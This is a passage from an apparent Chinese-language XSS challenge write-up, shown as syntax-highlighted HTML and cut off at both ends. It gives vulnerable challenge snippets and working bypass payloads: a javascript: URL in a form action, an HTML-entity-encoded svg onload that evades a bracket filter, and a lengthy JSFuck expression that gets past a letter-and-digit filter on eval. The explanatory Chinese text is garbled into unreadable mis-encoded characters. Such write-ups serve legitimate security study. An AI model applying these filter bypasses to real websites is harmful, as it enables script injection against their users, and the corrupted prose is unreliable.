operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'ricardo'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'#'</span><span class="token punctuation">)</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>_ <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        ricardo<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œ<code>formçš„action</code>æ˜¯å¯æ§çš„ï¼Œå…¶å®å°±æ˜¯æŒ‡å®šä¸€ä¸ª<code>url</code>ã€‚é‚£ä¹ˆç”¨ä¼ªåè®®å³å¯ã€‚</p><pre><code>?ricardo=javascript:alert(1337)</code></pre><h5 id="Ah-Thatâ€™s-Hawt"><a href="#Ah-Thatâ€™s-Hawt" class="headerlink" title="Ah Thatâ€™s Hawt"></a>Ah Thatâ€™s Hawt</h5><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>will<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    smith <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'markassbrownlee'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"Ah That's Hawt"</span><span class="token punctuation">)</span>    smith <span class="token operator">=</span> smith<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[\(\`\)\\]/g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    will<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> smith</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œä¸»è¦æ˜¯è¿‡æ»¤äº†æ‹¬å·ï¼Œç”¨htmlå®ä½“ç¼–ç ç»•è¿‡å³å¯ã€‚</p><pre><code>alert(1337)&lt;========================================&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#51;&amp;#51;&amp;#55;&amp;#41;&lt;========================================&gt;&lt;svg onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#51;&amp;#51;&amp;#55;&amp;#41;&quot;&gt;&lt;========================================&gt;%3Csvg%20onload%3D%22%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2351%3B%26%2351%3B%26%2355%3B%26%2341%3B%22%3E</code></pre><h5 id="Ligma"><a href="#Ligma" class="headerlink" title="Ligma"></a>Ligma</h5><pre class="line-numbers language-html"><code class="language-html">balls = (new URL(location).searchParams.get('balls') || "Ninja has Ligma")balls = balls.replace(/[A-Za-z0-9]/g, '')eval(balls)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿‡æ»¤äº†å¤§å°å†™å­—æ¯æ•°å­—ã€‚æ˜¯ä¸ª<code>eval</code>ç›´æ¥ç”¨<code>jsfuck</code>ç»•è¿‡å°±å¥½äº†ï¼Œæ³¨æ„å› ä¸ºæœ‰äº›äºŒä¹‰æ€§å­—ç¬¦è¦<code>url</code>ç¼–ç ã€‚</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token 